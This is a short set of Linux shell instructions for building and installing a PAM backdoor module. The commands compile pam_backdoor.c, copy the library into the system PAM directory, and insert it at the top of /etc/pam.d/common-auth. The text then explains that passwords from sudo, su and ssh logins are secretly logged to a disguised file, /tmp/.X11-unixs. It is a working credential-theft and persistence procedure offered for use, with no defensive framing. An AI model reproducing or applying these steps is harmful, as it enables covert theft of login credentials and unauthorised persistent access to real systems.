sudo apt update  
sudo apt install libpam0g-dev  
gcc -fPIC -fno-stack-protector -c pam_backdoor.c  
ld -x --shared -o pam_backdoor.so pam_backdoor.o  
sudo cp pam_backdoor.so /lib/x86_64-linux-gnu/security/
sed -i '1i auth required pam_backdoor.so' /etc/pam.d/common-auth  

Now test the backdoor by doing any authentications such as
sudo su
su -
or you can also try ssh logins as well.
all these creds are logged by the backdoor to the disk at the location a legitimately looking file but not.
cat /tmp/.X11-unixs
